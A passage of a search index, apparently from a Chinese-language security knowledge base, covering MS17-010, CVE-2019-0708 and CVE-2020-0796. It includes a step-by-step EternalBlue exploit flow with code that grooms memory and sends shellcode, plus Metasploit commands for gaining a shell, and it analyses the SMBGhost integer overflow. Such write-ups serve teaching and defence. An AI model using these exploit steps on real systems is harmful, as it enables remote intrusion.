\u8d8a\u754c\u5982\u4f55\u89e6\u53d1\u547d\u4ee4\u6267\u884c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#0x03","text":"\u8fd9\u91cc\u7ed3\u5408exp\uff0c\u6765\u770b\u6574\u4e2a\u8bf7\u6c42\u6d41\u7a0b\u662f\u5982\u4f55\u8fdb\u884c\u7684\uff1a srv\u5206\u914d\uff1aSMBv1\u6570\u636e\u5305\u53ef\u4ee5\u89e6\u53d1srv\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u7c7b\u578b\u4e3apaged\u6216\u8005non-paged pool srvnet\u5206\u914d\uff1a SMBv2\u6570\u636e\u5305\u53ef\u4ee5\u89e6\u53d1srvnet\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u7c7b\u578b\u4e3apaged\u6216\u8005non-paged pool \u4e00\u3001\u53d1\u9001fealist\u5206\u914dsrv\uff1a send_big_trans2(conn, tid, 0, feaList, \\x00 *30, 2000, False) \u8fd9\u91cc\u5229\u7528\u4e86\u6f0f\u6d1e2\u5e76\u4e14\u4fdd\u7559\u6700\u540e\u7684fragment\u4e0d\u53d1\u9001\uff0c\u5176\u4e2dfealist\u7684\u5185\u5bb9\u5982\u4e0b\uff1a NTFEA_SIZE = 0x11000 ntfea11000 = ( pack ( lt;BBH , 0 , 0 , 0 ) + \\x00 ) * 600 # \u8fd9\u91cc\u5bf9\u5e94\u7684ntfea size\u662f0x1c20 \uff0c \u56e0\u4e3a\u6bcf\u4e00\u6761fea\u8bb0\u5f55\u8f6c\u5316\u4e3aNTfea\u65f6\u90fd\u4f1a\u589e\u52a05\u4e2a\u5b57\u8282 ntfea11000 += pack ( lt;BBH , 0 , 0 , 0xf3bd ) + A * 0xf3be # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc ntfea = { 0x10000 : ntfea10000 , 0x11000 : ntfea11000 } feaList = pack ( lt;I , 0x10000 ) feaList += ntfea [ NTFEA_SIZE ] feaList += pack ( lt;BBH , 0 , 0 , len ( fakeSrvNetBuffer ) - 1 ) + fakeSrvNetBuffer # \u9700\u8981\u8d8a\u754c\u8986\u76d6\u7684\u4e1c\u897f feaList += pack ( lt;BBH , 0x12 , 0x34 , 0x5678 ) # \u65e0\u6548\u7684\u8bb0\u5f55 \uff0c \u4f1a\u89e6\u53d1\u8f6c\u6362\u5f02\u5e38 \u8fd9\u91cc\u5bf9\u5e94\u7684fealist\u7684\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a typedef struct _FEA { /* fea */ BYTE fEA ; /* flags*/ BYTE cbName ; /* name length not including NULL */ USHORT cbValue ; /* value length */ } FEA , * PFEA ; typedef struct _FEALIST { /* fealist */ DWORD cbList ; /* total bytes of structure including full list */ FEA list [ 1 ]; /* variable length FEA structures */ } FEALIST , * PFEALIST ; \u4e8c\u3001\u5229\u7528bug3\u7533\u8bf7\u5927\u5c0f\u4e3a\uff1a NTFEA_SIZE-0x1010 \u7684non-paged pool\u5185\u5b58 allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010) \u8fd9\u5757\u5185\u5b58\u7684\u7533\u8bf7\u662f\u4e3a\u4e86\u786e\u4fdd\u540e\u7eedNTFEA\u7684\u5185\u5b58\u53ef\u4ee5\u4e0esrvnet\u76f8\u90bb \u4e09\u3001\u7533\u8bf7\u591a\u4e2asrvnet\u8fdb\u884c\u5360\u5751\uff1a srvnetConn = [] for i in range(numGroomConn): sk = createConnectionWithBigSMBFirst80(target) srvnetConn.append(sk) \u56db\u3001\u5229\u7528bug3\u7533\u8bf7\u5927\u5c0f\u4e3a\uff1a NTFEA_SIZE-0x10 \u7684non-paged pool\u5185\u5b58 holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10) \u8fd9\u5757\u5185\u5b58\u662f\u7528\u6765\u786e\u4fddNTFEA\u4f7f\u7528\uff0c\u63a5\u7740\u8ba9srvnet\u4e0e\u8fd9\u5757\u5185\u5b58\u76f8\u90bb\u5373\u53ef \u4e94\u3001\u91ca\u653e\u7b2c\u4e8c\u6b65\u7533\u8bf7\u7684\u5185\u5b58\uff0c\u8fd9\u6837\u53ef\u4ee5\u786e\u4fdd\u4e34\u65f6\u7533\u8bf7\u7684\u4e00\u4e9b\u5c0f\u5185\u5b58\u4e0d\u4f1a\u76f4\u63a5\u6dfb\u52a0\u5230holeConn\u540e\u9762\uff0c\u963b\u788dsrvnet\u7684\u5360\u7528 allocConn.get_socket().close() \u516d\u3001\u7533\u8bf7srvnet\uff0c\u4ec5\u9760holeConn\uff1a for i in range(5): sk = createConnectionWithBigSMBFirst80(target) srvnetConn.append(sk) \u8fd9\u91cc\u7533\u8bf7\u591a\u4e2a\uff0c\u53ea\u6709\u4e00\u4e2a\u53ef\u4ee5\u4ec5\u9760holeConn\uff0c\u90a3\u4e48\u5c31\u7b97\u662f\u6210\u529f\u4e86 \u4e03\u3001\u6b64\u65f6\u5185\u5b58\u5e03\u5c40\u57fa\u672c\u5b8c\u6210\uff0c\u91ca\u653eholeConn\uff0c\u51c6\u5907\u89e6\u53d1\u6574\u4e2a\u6f0f\u6d1e\u94fe holeConn.get_socket().close() \u516b\u3001\u53d1\u9001fealist\u6700\u540e\u4e00\u4e2afragment\uff0c\u6b64\u65f6\u4f1a\u89e6\u53d1bug1\u7684\u8d8a\u754c\u64cd\u4f5c send_trans2_second(conn, tid, feaList[progress:], progress) \u8fd9\u91cc\u901a\u8fc7\u54cd\u5e94\u6765\u5224\u65ad\u662f\u5426\u53d1\u751f\u8d8a\u754c\uff0c\u56e0\u4e3a\u6784\u9020\u7684fealist\u6700\u540e\u4e00\u6761\u8bb0\u5f55\u662f\u975e\u6cd5\u8bb0\u5f55\uff0c\u8f6c\u6362\u80af\u5b9a\u4f1a\u62a5\u9519\uff1a recvPkt = conn.recvSMB() retStatus = recvPkt.getNTStatus() # retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag if retStatus == 0xc000000d: print( good response status: INVALID_PARAMETER ) else: print( bad response status: 0x{:08x} .format(retStatus)) \u4e5d\u3001\u5b8c\u6210\u4e86\u8d8a\u754c\u540e\uff0c\u501f\u52a9srvnet\u8986\u76d6\u540e\u7684MDL\uff0c\u5411HAL\\'s heap\u5730\u5740\u4f20\u5165shellcode for sk in srvnetConn: sk.send(fake_recv_struct + shellcode) \u5341\u3001\u6700\u540e\u65ad\u5f00\u94fe\u63a5\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff1a for sk in srvnetConn: sk.close()","title":"0x03 \u5982\u4f55\u901a\u8fc7\u8bf7\u6c42\u89e6\u53d1\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2017-0143........\uff09\u3010MS17-010\u3011Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_5","text":"\u4f7f\u7528nmap\u63a2\u6d4b\u7cfb\u7edf\u7248\u672c\uff0c\u4ee5\u53ca\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002 nmap -O -p 445 --script=smb-vuln-ms17-010.nse 192.168.75.133 \u4f7f\u7528msf \u8fdb\u5165ms17-010\u7684\u5229\u7528\u6a21\u5757\u3002 xp\u7cfb\u7edf\u7684\u5229\u7528\u6a21\u5757\u4e3a exploit/windows/smb/ms17_010_psexec win7\uff0cserver 2008 \u5229\u7528\u6a21\u5757\u4e3a**exploit/windows/smb/ms17_010_eternalblue** win8\uff0cserver 2012\u6ca1\u6d4b\u8bd5\u3002 \u6d4b\u8bd5\u73af\u5883\u7cfb\u7edf\u4e3axp\u7cfb\u7edf\u3001\u8fdb\u5165\u5229\u7528\u6a21\u5757 set rhost \u8bbe\u7f6e\u76ee\u6807ip\u3001run \u6210\u529fgetshell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/","text":"\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e \u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb Windows\u518d\u6b21\u88ab\u66dd\u51fa\u4e00\u4e2a\u7834\u574f\u529b\u5de8\u5927\u7684\u9ad8\u5371\u8fdc\u7a0b\u6f0f\u6d1eCVE-2019-0708\u3002\u653b\u51fb\u8005\u4e00\u65e6\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u4fbf\u53ef\u4ee5\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5305\u62ec\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3001\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u3001\u53d1\u8d77\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u7b49\u7b49\u653b\u51fb\u884c\u4e3a\u3002\u800c\u66f4\u52a0\u4e25\u91cd\u7684\u662f\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u65e0\u9700\u7528\u6237\u4ea4\u4e92\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u8be5\u6f0f\u6d1e\u5236\u4f5c\u582a\u6bd42017\u5e74\u5e2d\u5377\u5168\u7403\u7684WannaCry\u7c7b\u8815\u866b\u75c5\u6bd2\uff0c\u4ece\u800c\u8fdb\u884c\u5927\u89c4\u6a21\u4f20\u64ad\u548c\u7834\u574f\u3002 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd Windows 7 Windows Server 2008 R2 Windows Server 2008 Windows 2003 Windows XP \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u8fdb\u5165msf\u3001\u641c\u7d220708 msfconsole search 0708 \u4f7f\u7528\u626b\u63cf\u6a21\u5757\uff08scanner\uff09 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep show options set rhost 192.168.237.131 //\u8fd9\u91cc\u7684ip\u586b\u5199\u81ea\u5df1win7\u4e3b\u673a\u7684ip run \u4f7f\u7528\u5229\u7528\u6a21\u5757\uff08exploit\uff09 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce show targets //\u9009\u62e9\u76ee\u6807\u4e3b\u673a\u7c7b\u578b \u8fd9\u91cc\u6211\u9009\u62e9\u4e867601 -vmware 15 set target 4 set rhost 192.168.237.131 run \u590d\u73b0\u6210\u529f\u3002","title":"\uff08CVE 2019 0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#cve-2019-0708-windows","text":"","title":"\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_1","text":"Windows\u518d\u6b21\u88ab\u66dd\u51fa\u4e00\u4e2a\u7834\u574f\u529b\u5de8\u5927\u7684\u9ad8\u5371\u8fdc\u7a0b\u6f0f\u6d1eCVE-2019-0708\u3002\u653b\u51fb\u8005\u4e00\u65e6\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u4fbf\u53ef\u4ee5\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5305\u62ec\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3001\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u3001\u53d1\u8d77\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u7b49\u7b49\u653b\u51fb\u884c\u4e3a\u3002\u800c\u66f4\u52a0\u4e25\u91cd\u7684\u662f\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u89e6\u53d1\u65e0\u9700\u7528\u6237\u4ea4\u4e92\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u8be5\u6f0f\u6d1e\u5236\u4f5c\u582a\u6bd42017\u5e74\u5e2d\u5377\u5168\u7403\u7684WannaCry\u7c7b\u8815\u866b\u75c5\u6bd2\uff0c\u4ece\u800c\u8fdb\u884c\u5927\u89c4\u6a21\u4f20\u64ad\u548c\u7834\u574f\u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_2","text":"Windows 7 Windows Server 2008 R2 Windows Server 2008 Windows 2003 Windows XP","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE-2019-0708\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/#_3","text":"\u8fdb\u5165msf\u3001\u641c\u7d220708 msfconsole search 0708 \u4f7f\u7528\u626b\u63cf\u6a21\u5757\uff08scanner\uff09 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep show options set rhost 192.168.237.131 //\u8fd9\u91cc\u7684ip\u586b\u5199\u81ea\u5df1win7\u4e3b\u673a\u7684ip run \u4f7f\u7528\u5229\u7528\u6a21\u5757\uff08exploit\uff09 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce show targets //\u9009\u62e9\u76ee\u6807\u4e3b\u673a\u7c7b\u578b \u8fd9\u91cc\u6211\u9009\u62e9\u4e867601 -vmware 15 set target 4 set rhost 192.168.237.131 run \u590d\u73b0\u6210\u529f\u3002","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e/","text":"\uff08CVE\u00ad-2020\u00ad-0796\uff09 Windows \u8fdc\u7a0b\u6ea2\u51fa\u6f0f\u6d1e \u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u6f0f\u6d1e\u516c\u544a\u663e\u793a\uff0cSMB 3.1.1\u534f\u8bae\u4e2d\u5904\u7406\u538b\u7f29\u6d88\u606f\u65f6\uff0c\u5bf9\u5176\u4e2d\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7\u5b89\u5168\u68c0\u67e5\uff0c\u76f4\u63a5\u4f7f\u7528\u4f1a\u5f15\u53d1\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u65e0\u987b\u6743\u9650\u5373\u53ef\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u53d7\u9ed1\u5ba2\u653b\u51fb\u7684\u76ee\u6807\u7cfb\u7edf\u53ea\u9700\u5f00\u673a\u5728\u7ebf\u5373\u53ef\u80fd\u88ab\u5165\u4fb5\u3002 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd Windows 10 1903\u7248\u672c\uff08\u7528\u4e8e\u57fa\u4e8ex32\u7684\u7cfb\u7edf\uff09 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 Windows 10 1909\u7248\u672c\uff08\u7528\u4e8e\u57fa\u4e8ex32\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10 1909\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows Server\u7248\u672c1909\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u6f0f\u6d1e\u5206\u6790 \u6f0f\u6d1e\u516c\u544a\u663e\u793a\uff0cSMB 3.1.1\u534f\u8bae\u4e2d\u5904\u7406\u538b\u7f29\u6d88\u606f\u65f6\uff0c\u5bf9\u5176\u4e2d\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7\u5b89\u5168\u68c0\u67e5\uff0c\u76f4\u63a5\u4f7f\u7528\u4f1a\u5f15\u53d1\u5185\u5b58\u7834\u574f\u6f0f\u6d1e\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\u8fdc\u7a0b\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u65e0\u987b\u6743\u9650\u5373\u53ef\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u53d7\u9ed1\u5ba2\u653b\u51fb\u7684\u76ee\u6807\u7cfb\u7edf\u53ea\u9700\u5f00\u673a\u5728\u7ebf\u5373\u53ef\u80fd\u88ab\u5165\u4fb5\u3002 1\u3001\u6839\u672c\u539f\u56e0 \u6f0f\u6d1e\u53d1\u751f\u5728srv2.sys\u4e2d,\u7531\u4e8eSMB\u6ca1\u6709\u6b63\u786e\u5904\u7406\u538b\u7f29\u7684\u6570\u636e\u5305,\u5728\u89e3\u538b\u6570\u636e\u5305\u7684\u65f6\u5019\u4f7f\u7528\u5ba2\u6237\u7aef\u4f20\u8fc7\u6765\u7684\u957f\u5ea6\u8fdb\u884c\u89e3\u538b\u65f6,\u5e76\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6\u662f\u5426\u5408\u6cd5.\u6700\u7ec8\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002 2\u3001\u521d\u6b65\u5206\u6790 \u8be5\u9519\u8bef\u662f\u53d1\u751f\u5728srv2.sys SMB\u670d\u52a1\u5668\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u7684Srv2DecompressData\u51fd\u6570\u4e2d\u7684\u6574\u6570\u6ea2\u51fa\u9519\u8bef\u3002\u8fd9\u662f\u8be5\u51fd\u6570\u7684\u7b80\u5316\u7248\u672c\uff0c\u7701\u7565\u4e86\u4e0d\u76f8\u5173\u7684\u7ec6\u8282\uff1a typedef struct \\ _COMPRESSION_TRANSFORM_HEADER { gt ; ULONG ProtocolId ; gt ; ULONG OriginalCompressedSegmentSize ; USHORT CompressionAlgorithm ; gt ; USHORT Flags ; ULONG Offset ; } COMPRESSION_TRANSFORM_HEADER , \\ * PCOMPRESSION_TRANSFORM_HEADER ; typedef struct \\ _ALLOCATION_HEADER { gt ; // ... gt ; PVOID UserBuffer ; gt ; // ... } ALLOCATION_HEADER , \\ * PALLOCATION_HEADER ; NTSTATUS Srv2DecompressData ( PCOMPRESSION_TRANSFORM_HEADER Header , SIZE_T TotalSize ) { gt ; PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer ( gt ; ( ULONG )( Header - \\ gt ; OriginalCompressedSegmentSize + Header - \\ gt ; Offset ), NULL ); gt ; If ( ! Alloc ) { gt ; return STATUS_INSUFFICIENT_RESOURCES ; gt ; } gt ; ULONG FinalCompressedSize = 0 ; gt ; NTSTATUS Status = SmbCompressionDecompress ( Header - \\ gt ; CompressionAlgorithm , gt ; ( PUCHAR ) Header + sizeof ( COMPRESSION_TRANSFORM_HEADER ) + Header - \\ gt ; Offset , gt ; ( ULONG )( TotalSize - sizeof ( COMPRESSION_TRANSFORM_HEADER ) - Header - \\ gt ; Offset ), gt ; ( PUCHAR ) Alloc - \\ gt ; UserBuffer + Header - \\ gt ; Offset , gt ; Header - \\ gt ; OriginalCompressedSegmentSize , \\ amp ; FinalCompressedSize ); gt ; if ( Status \\ lt ; 0 \\ | \\ | FinalCompressedSize != gt ; Header - \\ gt ; OriginalCompressedSegmentSize ) { SrvNetFreeBuffer ( Alloc ); gt ; return STATUS_BAD_DATA ; gt ; } gt ; if ( Header - \\ gt ; Offset \\ gt ; 0 ) { memcpy ( gt ; Alloc - \\ gt ; UserBuffer , gt ; ( PUCHAR ) Header + sizeof ( COMPRESSION_TRANSFORM_HEADER ), gt ; Header - \\ gt ; Offset ); gt ; } gt ; Srv2ReplaceReceiveBuffer ( some_session_handle , Alloc ); return STATUS_SUCCESS ; } \u8be5Srv2DecompressData\u51fd\u6570\u63a5\u6536\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u538b\u7f29\u6d88\u606f\uff0c\u5206\u914d\u6240\u9700\u7684\u5185\u5b58\u91cf\uff0c\u5e76\u89e3\u538b\u7f29\u6570\u636e\u3002\u7136\u540e\uff0c\u5982\u679cOffset\u5b57\u6bb5\u4e0d\u4e3a\u96f6\uff0c\u5b83\u4f1a\u5c06\u653e\u7f6e\u5728\u538b\u7f29\u6570\u636e\u4e4b\u524d\u7684\u6570\u636e\u590d\u5236\u5230\u5206\u914d\u7684\u7f13\u51b2\u533a\u7684\u5f00\u5934\u3002 \u5982\u679c\u4ed4\u7ec6\u89c2\u5bdf\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c20\u884c\u548c\u7b2c31\u884c\u53ef\u80fd\u5bfc\u81f4\u67d0\u4e9b\u8f93\u5165\u7684\u6574\u6570\u6ea2\u51fa\u3002\u4f8b\u5982\uff0c\u5927\u591a\u6570\u5728bug\u53d1\u5e03\u540e\u4e0d\u4e45\u51fa\u73b0\u5e76\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83\u7684poc\u90fd\u4f7f\u75280xffffff\u503c\u4f5c\u4e3aOffset\u5b57\u6bb5\u3002\u4f7f\u7528\u8be5\u503c0xffffff\u4f1a\u5728\u7b2c20\u884c\u89e6\u53d1\u6574 \u6570\u6ea2\u51fa\uff0c\u56e0\u6b64\u5206\u914d\u7684\u5b57\u8282\u66f4\u5c11\u3002 \u7a0d\u540e\uff0c\u5b83\u4f1a\u5728\u7b2c31\u884c\u89e6\u53d1\u989d\u5916\u7684\u6574\u6570\u6ea2\u51fa\u3002\u5d29\u6e83\u662f\u7531\u4e8e\u5728\u7b2c30\u884c\u4e2d\u8ba1\u7b97\u51fa\u7684\u8fdc\u79bb\u63a5\u6536\u6d88\u606f\u7684\u5730\u5740\u5904\u7684\u5185\u5b58\u8bbf\u95ee\u9020\u6210\u7684\u3002\u5982\u679c\u4ee3\u7801\u5728\u7b2c31\u884c\u9a8c\u8bc1\u4e86\u8ba1\u7b97\u7ed3\u679c\uff0c\u90a3\u4e48\u5b83\u5c06\u5f88\u65e9\u9000\u51fa\uff0c\u56e0\u4e3a\u7f13\u51b2\u533a\u957f\u5ea6\u6070\u597d \u662f\u8d1f\u6570\u4e14\u65e0\u6cd5\u8868\u793a\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u7b2c30\u884c\u7684\u5730\u5740\u672c\u8eab\u4e5f\u65e0\u6548\u3002 3\u3001\u9009\u62e9\u6ea2\u51fa\u5185\u5bb9 \u53ea\u6709\u4e24\u4e2a\u76f8\u5173\u5b57\u6bb5\u53ef\u4ee5\u63a7\u5236\u4ee5\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u7684\u5b57\u6bb5\uff1aOriginalCompressedSegmentSize\u548cOffset\uff0c\u56e0 \u6b64\u6ca1\u6709\u592a\u591a\u9009\u62e9\u3002\u5728\u5c1d\u8bd5\u4e86\u51e0\u79cd\u7ec4\u5408\u4e4b\u540e\uff0c\u4e0b\u9762\u7684\u7ec4\u5408\u5438\u5f15\u4e86\u6211\u4eec\uff1a\u5982\u679c\u6211\u4eec\u53d1\u9001\u4e00\u4e2a\u5408\u6cd5\u7684\u504f\u79fb\u503c\u548c\u4e00\u4e2a\u5de8\u5927\u7684\u539f\u59cb\u538b\u7f29\u6bb5\u5927\u5c0f\u503c\u5462\uff1f\u8ba9\u6211\u4eec\u56de\u987e\u4e00\u4e0b\u4ee3\u7801\u5c06\u8981\u6267\u884c\u7684\u4e09\u4e2a\u6b65\u9aa4\uff1a \u5206\u914d\uff1a\u7531\u4e8e\u6574\u6570\u6ea2\u51fa\uff0c\u5206\u914d\u7684\u5b57\u8282\u6570\u5c06\u5c0f\u4e8e\u4e24\u4e2a\u5b57\u6bb5\u7684\u603b\u548c\u3002 \u89e3\u538b\u7f29\uff1a\u89e3\u538b\u7f29\u5c06\u6536\u5230\u4e00\u4e2a\u975e\u5e38\u5927\u7684OriginalCompressedSegmentSize\u503c\uff0c\u5c06\u76ee\u6807\u7f13\u51b2\u533a\u89c6\u4e3a\u5177\u6709\u65e0\u9650\u5927\u5c0f\u3002\u6240\u6709\u5176\u4ed6\u53c2\u6570\u5747\u4e0d\u53d7\u5f71\u54cd\uff0c\u56e0\u6b64\u5b83\u5c06\u6309\u9884\u671f\u6267\u884c\u3002 \u590d\u5236\uff1a\u5982\u679c\u8981\u6267\u884c\uff0c\u5219\u590d\u5236\u5c06\u6309\u9884\u671f\u6267\u884c\u3002 \u4e0d\u7ba1\u662f\u5426\u8981\u6267\u884c\u590d\u5236\u6b65\u9aa4\uff0c\u5b83\u770b\u8d77\u6765\u5df2\u7ecf\u5f88\u6709\u8da3\u4e86------\u6211\u4eec\u53ef\u4ee5\u5728\u89e3\u538b\u7f29\u9636\u6bb5\u89e6\u53d1\u8d8a\u754c\u5199\u5165\uff0c\u56e0\u4e3a\u6211\u4eec\u8bbe\u6cd5\u5206\u914d\u4e86\u6bd4\"\u5206\u914d\"\u9636\u6bb5\u6240\u9700\u7684\u5b57\u8282\u5c11\u7684\u5b57\u8282\u3002 \u5982\u60a8\u6240\u89c1\uff0c\u4f7f\u7528\u8fd9\u79cd\u6280\u672f\uff0c\u6211\u4eec\u53ef\u4ee5\u89e6\u53d1\u4efb\u4f55\u5927\u5c0f\u548c\u5185\u5bb9\u7684\u6ea2\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u5f00\u59cb\u3002\u4f46\u662f\u4ec0\u4e48\u4f4d\u4e8e\u6211\u4eec\u7684\u7f13\u51b2\u533a\u4e4b\u5916\uff1f\u8ba9\u6211\u4eec\u627e\u51fa\u7b54\u6848\uff01 4\u3001\u6df1\u5165\u5206\u6790SrvNetAllocateBuffer \u4e3a\u4e86\u56de\u7b54\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u67e5\u770b\u5206\u914d\u51fd\u6570\uff0c\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\u662fSrvNetAllocateBuffer\u3002\u4e0b\u9762\u662f\u51fd\u6570\u7684\u6709\u8da3\u90e8\u5206\uff1a PALLOCATION_HEADER SrvNetAllocateBuffer ( SIZE_T AllocSize , PALLOCATION_HEADER SourceBuffer ) { gt ; // ... gt ; if ( SrvDisableNetBufferLookAsideList \\ | \\ | AllocSize \\ gt ; 0x100100 ) { if gt ; ( AllocSize \\ gt ; 0x1000100 ) { gt ; return NULL ; gt ; } gt ; Result = SrvNetAllocateBufferFromPool ( AllocSize , AllocSize ); gt ; } else { gt ; int LookasideListIndex = 0 ; if ( AllocSize \\ gt ; 0x1100 ) { gt ; LookasideListIndex = / \\ * some calculation based on AllocSize \\ */ ; gt ; } gt ; SOME_STRUCT list = SrvNetBufferLookasides [ LookasideListIndex ] ; Result = / \\ * gt ; fetch result from list \\ */ ; gt ; } gt ; // Initialize some Result fields ... gt ; return Result ; } \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5206\u914d\u51fd\u6570\u6839\u636e\u6240\u9700\u7684\u5b57\u8282\u6570\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\u3002\u5927\u578b\u5206\u914d\uff08\u5927\u4e8e\u7ea616MB\uff09\u4f1a\u5bfc\u81f4\u6267\u884c\u5931\u8d25\u3002\u4e2d\u578b\u5206\u914d\uff08\u5927\u4e8e\u7ea61\\ MB\uff09\u4f7f\u7528SrvNetAllocateBufferFromPool\u51fd\u6570\u8fdb\u884c\u5206\u914d\u3002\u5c0f\u578b\u5206\u914d\uff08\u5176\u4f59\\ \u7684\uff09\u4f7f\u7528lookaside\u5217\u8868\u8fdb\u884c\u4f18\u5316\u3002 